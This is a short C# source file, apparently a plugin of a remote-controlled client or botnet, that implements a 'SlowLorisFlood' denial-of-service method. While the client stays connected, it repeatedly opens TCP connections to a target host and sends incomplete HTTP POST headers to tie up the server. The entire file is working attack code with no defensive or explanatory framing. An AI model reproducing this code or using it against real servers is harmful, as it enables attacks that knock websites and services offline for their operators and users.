using System.Net.Sockets;
using System.Text;
using System.Threading;
using Plugin.Helper;

namespace Plugin.Methods;

internal class SlowLoris : Method
{
	public string Name { get; } = "SlowLorisFlood";


	public void Run(string host, int port)
	{
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				try
				{
					socket.Connect(host, port);
					if (socket.Connected)
					{
						byte[] bytes = Encoding.ASCII.GetBytes("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-length: 5235\r\n\r\n");
						socket.Send(bytes);
						Thread.Sleep(5000);
						socket.Dispose();
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
	}
}
